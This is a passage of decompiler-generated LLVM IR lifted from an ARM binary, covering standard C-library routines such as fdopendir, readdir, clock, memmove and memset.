dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10ec8
  br label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10ed8, %dec_label_pc_10ec0, %dec_label_pc_10ea8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10f30

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ec8
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_10ef4 = load i32, i32* @r7, align 4
  %v3_10ef8 = call i32 @__GI___fcntl_nocancel(i32 %v0_10ef4, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_10f00 = load i32, i32* @r7, align 4
  %v2_10f04 = call i32 @fd_to_DIR(i32 %v0_10f00, i32 %tmp)
  store i32 %v2_10f04, i32* %r1.global-to-local, align 4
  %v2_10f08 = icmp eq i32 %v2_10f04, 0
  br i1 %v2_10f08, label %dec_label_pc_10f10, label %dec_label_pc_10f30

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10eec
  %v0_10f20 = call i32 @__aeabi_read_tp()
  %v3_10f24 = load i16, i16* @global_var_216f0.341, align 2
  %v4_10f24 = sext i16 %v3_10f24 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_10f2c = add i32 %v4_10f24, %v0_10f20
  %v4_10f2c = inttoptr i32 %v3_10f2c to i32*
  store i32 12, i32* %v4_10f2c, align 4
  %v0_10f30.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10eec, %dec_label_pc_10ee4, %dec_label_pc_10f10
  %v0_10f30 = phi i32 [ %v2_10f04, %dec_label_pc_10eec ], [ 0, %dec_label_pc_10ee4 ], [ %v0_10f30.pre, %dec_label_pc_10f10 ]
  store i32 %v3_10e88, i32* @r7, align 4
  ret i32 %v0_10f30

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10f30, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f40:
  %v0_10f40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10f40, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10f40
  %v1_10f40 = load i32, i32* @r8, align 4
  %v5_10f40 = mul i32 %arg1, 65536
  %v6_10f40 = and i32 %v1_10f40, %v5_10f40
  %v5_10f48 = sdiv i32 %v6_10f40, 32768
  %v6_10f48 = and i32 %v5_10f48, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10f40, %bb
  %v7_10f48 = phi i32 [ %arg1, %dec_label_pc_10f40 ], [ %v6_10f48, %bb ]
  ret i32 %v7_10f48

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_10f50 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10f50, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_10f5c = call i32 @fstat()
  store i32 %v0_10f5c, i32* @r5, align 4
  %v2_10f60 = icmp eq i32 %v0_10f5c, 0
  br i1 %v2_10f60, label %dec_label_pc_10f68, label %dec_label_pc_10fe0

dec_label_pc_10f68:                               ; preds = %entry
  %v1_10f6c = and i32 %tmp4, 61440
  store i32 %v1_10f6c, i32* @r3, align 4
  %v7_10f70 = icmp eq i32 %v1_10f6c, 16384
  br i1 %v7_10f70, label %dec_label_pc_10f90, label %dec_label_pc_10f78

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f68
  %v0_10f7c = call i32 @__aeabi_read_tp()
  %v3_10f80 = load i16, i16* @global_var_216f0.341, align 2
  %v0_10f84 = load i32, i32* @r5, align 4
  store i32 %v0_10f84, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fc4

dec_label_pc_10f90:                               ; preds = %dec_label_pc_10f68
  %v0_10f90 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_10f98 = call i32 @__libc_fcntl(i32 %v0_10f90, i32 3)
  %v7_10f9c = icmp eq i32 %v2_10f98, -1
  br i1 %v7_10f9c, label %dec_label_pc_10fe0, label %dec_label_pc_10fa4

dec_label_pc_10fa4:                               ; preds = %dec_label_pc_10f90
  %v1_10fa4 = urem i32 %v2_10f98, 4
  store i32 %v1_10fa4, i32* %r3.global-to-local, align 4
  %v7_10fa8 = icmp eq i32 %v1_10fa4, 1
  br i1 %v7_10fa8, label %dec_label_pc_10fb0, label %dec_label_pc_10fcc

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10fa4
  %v0_10fb4 = call i32 @__aeabi_read_tp()
  %v3_10fb8 = load i16, i16* @global_var_216f0.341, align 2
  %v0_10fbc = load i32, i32* @r5, align 4
  store i32 %v0_10fbc, i32* %r1.global-to-local, align 4
  %v0_10fc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10fc0 = add i32 %v0_10fc0, 21
  br label %dec_label_pc_10fc4

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10f78, %dec_label_pc_10fb0
  %v2_10fc4.in = phi i16 [ %v3_10f80, %dec_label_pc_10f78 ], [ %v3_10fb8, %dec_label_pc_10fb0 ]
  %v1_10fc4 = phi i32 [ %v0_10f7c, %dec_label_pc_10f78 ], [ %v0_10fb4, %dec_label_pc_10fb0 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_10f78 ], [ %v1_10fc0, %dec_label_pc_10fb0 ]
  %v2_10fc4 = sext i16 %v2_10fc4.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_10fc4 = add i32 %v1_10fc4, %v2_10fc4
  %v4_10fc4 = inttoptr i32 %v3_10fc4 to i32*
  store i32 %storemerge, i32* %v4_10fc4, align 4
  %v0_10fe4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fe4

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fa4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_10fd0 = load i32, i32* @r4, align 4
  %v2_10fd4 = call i32 @fd_to_DIR(i32 %v0_10fd0, i32 %tmp)
  store i32 %v2_10fd4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fe4

dec_label_pc_10fe0:                               ; preds = %entry, %dec_label_pc_10f90
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fe4

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10fcc, %dec_label_pc_10fc4, %dec_label_pc_10fe0
  %v0_10fe4 = phi i32 [ %v2_10fd4, %dec_label_pc_10fcc ], [ %v0_10fe4.pre, %dec_label_pc_10fc4 ], [ 0, %dec_label_pc_10fe0 ]
  ret i32 %v0_10fe4

; uselistorder directives
  uselistorder i32 %v1_10fa4, { 1, 0 }
  uselistorder i32 %v2_10f98, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 5, 0, 6, 7, 4, 1, 8, 2, 9, 3, 10 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_10fe4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10fc4, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10ffc = load i32, i32* @r4, align 4
  %v6_10ffc = load i32, i32* @r5, align 4
  %v9_10ffc = load i32, i32* @r6, align 4
  %v12_10ffc = load i32, i32* @r7, align 4
  %v15_10ffc = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r6, align 4
  %v1_11010 = add i32 %tmp, 24
  store i32 %v1_11010, i32* @r4, align 4
  %v4_11014 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 68) to i32*), align 4
  store i32 %v4_11014, i32* %r1.global-to-local, align 4
  store i32 %v1_11010, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11028 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11028)
  %v0_1103c = load i32, i32* @r6, align 4
  %v2_1103c = add i32 %v0_1103c, 16
  %v3_1103c = inttoptr i32 %v2_1103c to i32*
  %v4_1103c = load i32, i32* %v3_1103c, align 4
  store i32 %v4_1103c, i32* @ip, align 4
  store i32 69704, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1103c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1104c

dec_label_pc_1104c:                               ; preds = %dec_label_pc_1107c, %entry
  %v0_1104c = load i32, i32* @r5, align 4
  %v1_1104c = add i32 %v0_1104c, 4
  %v2_1104c = inttoptr i32 %v1_1104c to i32*
  %v3_1104c = load i32, i32* %v2_1104c, align 4
  store i32 %v3_1104c, i32* %r2.global-to-local, align 4
  %v4_1104c = add i32 %v0_1104c, 8
  %v5_1104c = inttoptr i32 %v4_1104c to i32*
  %v6_1104c = load i32, i32* %v5_1104c, align 4
  %tmp10 = icmp ugt i32 %v6_1104c, %v3_1104c
  br i1 %tmp10, label %dec_label_pc_1107c, label %dec_label_pc_11058

dec_label_pc_11058:                               ; preds = %dec_label_pc_1104c
  %v1_11058 = inttoptr i32 %v0_1104c to i32*
  %v2_11058 = load i32, i32* %v1_11058, align 4
  %v1_1105c = add i32 %v0_1104c, 12
  %v2_1105c = inttoptr i32 %v1_1105c to i32*
  %v3_1105c = load i32, i32* %v2_1105c, align 4
  store i32 %v3_1105c, i32* %r1.global-to-local, align 4
  %v1_11060 = add i32 %v0_1104c, 20
  %v2_11060 = inttoptr i32 %v1_11060 to i32*
  %v3_11060 = load i32, i32* %v2_11060, align 4
  store i32 %v3_11060, i32* %r2.global-to-local, align 4
  %v4_11064 = call i32 @__getdents(i32 %v2_11058, i32 %v3_1105c, i32 %v3_11060, i32 %v6_1104c)
  %tmp9 = icmp slt i32 %v4_11064, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11074

.thread:                                          ; preds = %dec_label_pc_11058
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_110a8

dec_label_pc_11074:                               ; preds = %dec_label_pc_11058
  %v1_11074 = load i32, i32* @r5, align 4
  %v2_11074 = add i32 %v1_11074, 8
  %v3_11074 = inttoptr i32 %v2_11074 to i32*
  store i32 %v4_11064, i32* %v3_11074, align 4
  %v0_11078 = load i32, i32* @r7, align 4
  %v1_11078 = load i32, i32* @r5, align 4
  %v2_11078 = add i32 %v1_11078, 4
  %v3_11078 = inttoptr i32 %v2_11078 to i32*
  store i32 %v0_11078, i32* %v3_11078, align 4
  %v0_1107c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1107c

dec_label_pc_1107c:                               ; preds = %dec_label_pc_1104c, %dec_label_pc_11074
  %v1_1108c = phi i32 [ %v0_1104c, %dec_label_pc_1104c ], [ %v0_1107c.pre, %dec_label_pc_11074 ]
  %v1_1107c = add i32 %v1_1108c, 4
  %v2_1107c = inttoptr i32 %v1_1107c to i32*
  %v3_1107c = load i32, i32* %v2_1107c, align 4
  store i32 %v3_1107c, i32* %r2.global-to-local, align 4
  %v1_11080 = add i32 %v1_1108c, 12
  %v2_11080 = inttoptr i32 %v1_11080 to i32*
  %v3_11080 = load i32, i32* %v2_11080, align 4
  store i32 %v3_11080, i32* %r1.global-to-local, align 4
  %v2_11084 = add i32 %v3_11080, %v3_1107c
  store i32 %v2_11084, i32* @r4, align 4
  %v1_11088 = add i32 %v2_11084, 4
  %v2_11088 = inttoptr i32 %v1_11088 to i32*
  %v3_11088 = load i32, i32* %v2_11088, align 4
  %v2_1108c = add i32 %v1_1108c, 16
  %v3_1108c = inttoptr i32 %v2_1108c to i32*
  store i32 %v3_11088, i32* %v3_1108c, align 4
  %v0_11090 = load i32, i32* @r4, align 4
  %v1_11090 = add i32 %v0_11090, 8
  %v2_11090 = inttoptr i32 %v1_11090 to i16*
  %v3_11090 = load i16, i16* %v2_11090, align 2
  %v4_11090 = zext i16 %v3_11090 to i32
  %v0_11094 = load i32, i32* %r2.global-to-local, align 4
  %v1_11094 = load i32, i32* %r1.global-to-local, align 4
  %v2_11094 = add i32 %v1_11094, %v0_11094
  %v3_11094 = inttoptr i32 %v2_11094 to i32*
  %v4_11094 = load i32, i32* %v3_11094, align 4
  store i32 %v4_11094, i32* %r1.global-to-local, align 4
  %v2_11098 = add i32 %v0_11094, %v4_11090
  %v2_1109c = icmp eq i32 %v4_11094, 0
  %v1_110a0 = load i32, i32* @r5, align 4
  %v2_110a0 = add i32 %v1_110a0, 4
  %v3_110a0 = inttoptr i32 %v2_110a0 to i32*
  store i32 %v2_11098, i32* %v3_110a0, align 4
  br i1 %v2_1109c, label %dec_label_pc_1104c, label %dec_label_pc_110a8

dec_label_pc_110a8:                               ; preds = %dec_label_pc_1107c, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_110b4 = load i32, i32* @r6, align 4
  %v2_110b4 = add i32 %v0_110b4, 44
  %v3_110b4 = inttoptr i32 %v2_110b4 to i32*
  %v4_110b4 = load i32, i32* %v3_110b4, align 4
  call void @__pseudo_branch(i32 %v4_110b4)
  %v0_110c0 = load i32, i32* @r4, align 4
  store i32 %v3_10ffc, i32* @r4, align 4
  store i32 %v6_10ffc, i32* @r5, align 4
  store i32 %v9_10ffc, i32* @r6, align 4
  store i32 %v12_10ffc, i32* @r7, align 4
  store i32 %v15_10ffc, i32* @lr, align 4
  ret i32 %v0_110c0

; uselistorder directives
  uselistorder i32 %v1_1108c, { 0, 2, 1 }
  uselistorder i32 %v6_1104c, { 1, 0 }
  uselistorder i32 %v0_1104c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1107c, { 1, 0 }
}

define i32 @function_110d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_110d4:
  %v0_110d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_110d4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_110d4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_110d4, %bb
  %v4_110e0 = phi i32 [ %arg1, %dec_label_pc_110d4 ], [ 0, %bb ]
  ret i32 %v4_110e0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_110e4 = load i32, i32* @lr, align 4
  %v0_110ec = call i32 @__aeabi_read_tp()
  %v3_110f0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_110f0 = sext i16 %v3_110f0 to i32
  %v2_110f4 = add i32 %v4_110f0, %v0_110ec
  store i32 %v0_110e4, i32* @lr, align 4
  ret i32 %v2_110f4
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11108 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11108, i32* @r0, align 4
  %v1_11110 = call i32 @times(i32 %v2_11108)
  %v2_11114 = load i32, i32* %stack_var_-24, align 4
  %v2_11118 = add i32 %v2_11114, %tmp
  %v2_11120 = mul i32 %v2_11118, 10000
  %v1_11124 = and i32 %v2_11120, 2147483632
  ret i32 %v1_11124

; uselistorder directives
  uselistorder i32 %v2_11108, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11134:
  %v0_11134 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11134, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11134
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11134, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11140 = call i32 @_memcpy()
  ret i32 %v0_11140
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11150 = call i32 @_memcpy()
  ret i32 %v0_11150

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11164 = icmp eq i32 %arg3, 8
  store i1 %v8_11164, i1* %cpsr_z.global-to-local, align 1
  %v5_11168 = icmp slt i32 %arg3, 8
  br i1 %v5_11168, label %dec_label_pc_111c8, label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %entry
  %v4_1116c = mul i32 %arg2, 256
  %v5_1116c = or i32 %v4_1116c, %arg2
  %v4_11170 = mul i32 %v5_1116c, 65536
  %v5_11170 = or i32 %v4_11170, %v5_1116c
  store i32 %v5_11170, i32* @r1, align 4
  %v1_1117457 = urem i32 %tmp, 4
  %v2_1117458 = icmp eq i32 %v1_1117457, 0
  store i1 %v2_1117458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1117458, label %dec_label_pc_11184, label %bb

bb:                                               ; preds = %dec_label_pc_1116c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1116c ]
  %v3_1117859 = phi i32 [ %v6_11178, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1116c ]
  %v4_11178 = inttoptr i32 %v3_1117859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11178, align 1
  %v5_11178 = load i32, i32* @r3, align 4
  %v6_11178 = add i32 %v5_11178, 1
  store i32 %v6_11178, i32* @r3, align 4
  %v0_1117c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11188.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_1117c.pr, label %dec_label_pc_11184, label %.thread

.thread:                                          ; preds = %bb
  %v2_1117c = add i32 %v0_11188.pr.pre, -1
  store i32 %v2_1117c, i32* %r2.global-to-local, align 4
  %v1_11174 = urem i32 %v6_11178, 4
  %v2_11174 = icmp eq i32 %v1_11174, 0
  store i1 %v2_11174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11174, label %dec_label_pc_11184, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11178.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11178.pre to i8
  br label %bb

dec_label_pc_11184:                               ; preds = %.thread, %bb, %dec_label_pc_1116c
  %v0_1119028 = phi i32 [ %tmp, %dec_label_pc_1116c ], [ %v6_11178, %bb ], [ %v6_11178, %.thread ]
  %v0_11188.pr = phi i32 [ %arg3, %dec_label_pc_1116c ], [ %v0_11188.pr.pre, %bb ], [ %v2_1117c, %.thread ]
  %v0_11184 = load i32, i32* @r1, align 4
  store i32 %v0_11184, i32* %ip.global-to-local, align 4
  %v8_1118810 = icmp eq i32 %v0_11188.pr, 8
  store i1 %v8_1118810, i1* %cpsr_z.global-to-local, align 1
  %v5_1118c11 = icmp slt i32 %v0_11188.pr, 8
  br i1 %v5_1118c11, label %dec_label_pc_111c8, label %dec_label_pc_11190.preheader

dec_label_pc_11190.preheader:                     ; preds = %dec_label_pc_11184
  %v1_1119046 = inttoptr i32 %v0_1119028 to i32*
  store i32 %v0_11184, i32* %v1_1119046, align 4
  %v3_1119047 = add i32 %v0_1119028, 4
  %v4_1119048 = inttoptr i32 %v3_1119047 to i32*
  %v5_1119049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1119049, i32* %v4_1119048, align 4
  %v6_1119050 = add i32 %v0_1119028, 8
  store i32 %v6_1119050, i32* @r3, align 4
  %v0_1119451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1119452 = add i32 %v0_1119451, -8
  store i32 %v1_1119452, i32* %r2.global-to-local, align 4
  %v5_1119c53 = icmp slt i32 %v1_1119452, 8
  br i1 %v5_1119c53, label %dec_label_pc_11190.dec_label_pc_111c8.loopexit_crit_edge, label %dec_label_pc_111a0

dec_label_pc_111a0:                               ; preds = %dec_label_pc_11190.preheader, %dec_label_pc_11188.dec_label_pc_11190_crit_edge
  %v6_1119055 = phi i32 [ %v6_11190, %dec_label_pc_11188.dec_label_pc_11190_crit_edge ], [ %v6_1119050, %dec_label_pc_11190.preheader ]
  %v0_1119054 = phi i32 [ %v12_111bc, %dec_label_pc_11188.dec_label_pc_11190_crit_edge ], [ %v0_1119028, %dec_label_pc_11190.preheader ]
  %v1_111a0 = inttoptr i32 %v6_1119055 to i32*
  %v2_111a0 = load i32, i32* @r1, align 4
  store i32 %v2_111a0, i32* %v1_111a0, align 4
  %v3_111a0 = add i32 %v0_1119054, 12
  %v4_111a0 = inttoptr i32 %v3_111a0 to i32*
  %v5_111a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_111a0, i32* %v4_111a0, align 4
  %v6_111a0 = add i32 %v0_1119054, 16
  store i32 %v6_111a0, i32* @r3, align 4
  %v0_111a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_111a4 = add i32 %v0_111a4, -8
  store i32 %v1_111a4, i32* %r2.global-to-local, align 4
  %v5_111ac = icmp slt i32 %v1_111a4, 8
  br i1 %v5_111ac, label %dec_label_pc_111a0.dec_label_pc_111c8.loopexit_crit_edge, label %dec_label_pc_111b0

dec_label_pc_111b0:                               ; preds = %dec_label_pc_111a0
  %v1_111b0 = inttoptr i32 %v6_111a0 to i32*
  %v2_111b0 = load i32, i32* @r1, align 4
  store i32 %v2_111b0, i32* %v1_111b0, align 4
  %v3_111b0 = add i32 %v0_1119054, 20
  %v4_111b0 = inttoptr i32 %v3_111b0 to i32*
  %v5_111b0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_111b0, i32* %v4_111b0, align 4
  %v6_111b0 = add i32 %v0_1119054, 24
  store i32 %v6_111b0, i32* @r3, align 4
  %v0_111b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_111b4 = add i32 %v0_111b4, -8
  store i32 %v1_111b4, i32* %r2.global-to-local, align 4
  %v5_111bc = icmp slt i32 %v1_111b4, 8
  br i1 %v5_111bc, label %dec_label_pc_111b0.dec_label_pc_111c8.loopexit_crit_edge, label %dec_label_pc_11188

dec_label_pc_11188:                               ; preds = %dec_label_pc_111b0
  %v7_111bc = inttoptr i32 %v6_111b0 to i32*
  %v8_111bc = load i32, i32* @r1, align 4
  store i32 %v8_111bc, i32* %v7_111bc, align 4
  %v9_111bc = add i32 %v0_1119054, 28
  %v10_111bc = inttoptr i32 %v9_111bc to i32*
  %v11_111bc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_111bc, i32* %v10_111bc, align 4
  %v12_111bc = add i32 %v0_1119054, 32
  store i32 %v12_111bc, i32* @r3, align 4
  %v6_111c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_111c0 = add i32 %v6_111c0, -8
  store i32 %v7_111c0, i32* %r2.global-to-local, align 4
  %v5_1118c = icmp slt i32 %v7_111c0, 8
  br i1 %v5_1118c, label %dec_label_pc_11188.dec_label_pc_111c8.loopexit_crit_edge, label %dec_label_pc_11188.dec_label_pc_11190_crit_edge

dec_label_pc_11188.dec_label_pc_11190_crit_edge:  ; preds = %dec_label_pc_11188
  %v2_11190.pre = load i32, i32* @r1, align 4
  %v1_11190 = inttoptr i32 %v12_111bc to i32*
  store i32 %v2_11190.pre, i32* %v1_11190, align 4
  %v3_11190 = add i32 %v0_1119054, 36
  %v4_11190 = inttoptr i32 %v3_11190 to i32*
  %v5_11190 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11190, i32* %v4_11190, align 4
  %v6_11190 = add i32 %v0_1119054, 40
  store i32 %v6_11190, i32* @r3, align 4
  %v0_11194 = load i32, i32* %r2.global-to-local, align 4
  %v1_11194 = add i32 %v0_11194, -8
  store i32 %v1_11194, i32* %r2.global-to-local, align 4
  %v5_1119c = icmp slt i32 %v1_11194, 8
  br i1 %v5_1119c, label %dec_label_pc_11190.dec_label_pc_111c8.loopexit_crit_edge, label %dec_label_pc_111a0

dec_label_pc_11188.dec_label_pc_111c8.loopexit_crit_edge: ; preds = %dec_label_pc_11188
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_111c8

dec_label_pc_11190.dec_label_pc_111c8.loopexit_crit_edge: ; preds = %dec_label_pc_11188.dec_label_pc_11190_crit_edge, %dec_label_pc_11190.preheader
  %v1_11194.lcssa = phi i32 [ %v1_1119452, %dec_label_pc_11190.preheader ], [ %v1_11194, %dec_label_pc_11188.dec_label_pc_11190_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_111c8

dec_label_pc_111a0.dec_label_pc_111c8.loopexit_crit_edge: ; preds = %dec_label_pc_111a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_111c8

dec_label_pc_111b0.dec_label_pc_111c8.loopexit_crit_edge: ; preds = %dec_label_pc_111b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_11184, %dec_label_pc_11188.dec_label_pc_111c8.loopexit_crit_edge, %dec_label_pc_11190.dec_label_pc_111c8.loopexit_crit_edge, %dec_label_pc_111a0.dec_label_pc_111c8.loopexit_crit_edge, %dec_label_pc_111b0.dec_label_pc_111c8.loopexit_crit_edge, %entry
  %v0_111d0 = phi i32 [ %arg3, %entry ], [ %v1_111b4, %dec_label_pc_111b0.dec_label_pc_111c8.loopexit_crit_edge ], [ %v1_111a4, %dec_label_pc_111a0.dec_label_pc_111c8.loopexit_crit_edge ], [ %v1_11194.lcssa, %dec_label_pc_11190.dec_label_pc_111c8.loopexit_crit_edge ], [ %v7_111c0, %dec_label_pc_11188.dec_label_pc_111c8.loopexit_crit_edge ], [ %v0_11188.pr, %dec_label_pc_11184 ]
  %v2_111c8 = icmp eq i32 %v0_111d0, 0
  store i1 %v2_111c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_111c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_111c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_111c8
  %v1_111d0 = sub i32 7, %v0_111d0
  store i32 %v1_111d0, i32* %r2.global-to-local, align 4
  %v3_111d4 = mul i32 %v1_111d0, 4
  %v4_111d4 = add i32 %v3_111d4, ptrtoint (i32* @global_var_111dc.387 to i32)
  call void @__pseudo_branch(i32 %v4_111d4)
  %v0_111dc = load i32, i32* @r1, align 4
  %v1_111dc = trunc i32 %v0_111dc to i8
  %v2_111dc = load i32, i32* @r3, align 4
  %v3_111dc = inttoptr i32 %v2_111dc to i8*
  store i8 %v1_111dc, i8* %v3_111dc, align 1
  %v4_111dc = load i32, i32* @r3, align 4
  %v5_111dc = add i32 %v4_111dc, 1
  store i32 %v5_111dc, i32* %r3.global-to-local, align 4
  %v0_111e0 = load i32, i32* @r1, align 4
  %v1_111e0 = trunc i32 %v0_111e0 to i8
  %v3_111e0 = inttoptr i32 %v5_111dc to i8*
  store i8 %v1_111e0, i8* %v3_111e0, align 1
  %v4_111e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_111e0 = add i32 %v4_111e0, 1
  store i32 %v5_111e0, i32* %r3.global-to-local, align 4
  %v0_111e4 = load i32, i32* @r1, align 4
  %v1_111e4 = trunc i32 %v0_111e4 to i8
  %v3_111e4 = inttoptr i32 %v5_111e0 to i8*
  store i8 %v1_111e4, i8* %v3_111e4, align 1
  %v4_111e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_111e4 = add i32 %v4_111e4, 1
  store i32 %v5_111e4, i32* %r3.global-to-local, align 4
  %v0_111e8 = load i32, i32* @r1, align 4
  %v1_111e8 = trunc i32 %v0_111e8 to i8
  %v3_111e8 = inttoptr i32 %v5_111e4 to i8*
  store i8 %v1_111e8, i8* %v3_111e8, align 1
  %v4_111e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_111e8 = add i32 %v4_111e8, 1
  store i32 %v5_111e8, i32* %r3.global-to-local, align 4
  %v0_111ec = load i32, i32* @r1, align 4
  %v1_111ec = trunc i32 %v0_111ec to i8
  %v3_111ec = inttoptr i32 %v5_111e8 to i8*
  store i8 %v1_111ec, i8* %v3_111ec, align 1
  %v4_111ec = load i32, i32* %r3.global-to-local, align 4
  %v5_111ec = add i32 %v4_111ec, 1
